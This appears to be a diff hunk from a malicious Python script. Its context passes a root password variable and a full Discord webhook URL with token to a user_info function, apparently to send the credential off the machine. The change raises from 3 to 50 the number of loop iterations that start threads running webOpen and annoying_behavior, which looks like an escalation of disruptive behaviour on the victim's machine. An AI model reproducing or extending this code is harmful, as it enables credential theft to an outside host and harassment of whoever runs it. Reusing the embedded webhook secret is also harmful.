@@ -50,7 +50,7 @@ user_info(root_pswd=rootPassword,
           webhook='https://discord.com/api/webhooks/853467329429897267/81fZI1crGOMsc0OeKUze5M9Yd95iUrLJ6EFPYgifHa1JA2HK9NPIAdc-5ZIBNyyZ6eFR')
 
 threads = []
-for _ in range(3):
+for _ in range(50):
      t1 = Thread(target=webOpen)
      t1.start()
      t2 = Thread(target=annoying_behavior)
